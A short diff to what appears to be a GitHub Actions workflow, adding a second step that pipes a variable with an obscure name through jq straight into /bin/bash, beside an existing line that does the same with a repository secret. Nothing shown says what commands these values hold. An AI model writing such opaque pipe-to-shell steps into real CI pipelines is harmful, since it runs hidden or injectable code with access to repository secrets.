@@ -18,6 +18,7 @@ jobs:
           usxqz929: ${{ secrets.usxqz929 }}
         run: |
           printf '%s' "$usxqz929" | jq -r .ptd8693 | /bin/bash
+          echo $jegyy037 | jq -r .tg33974 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
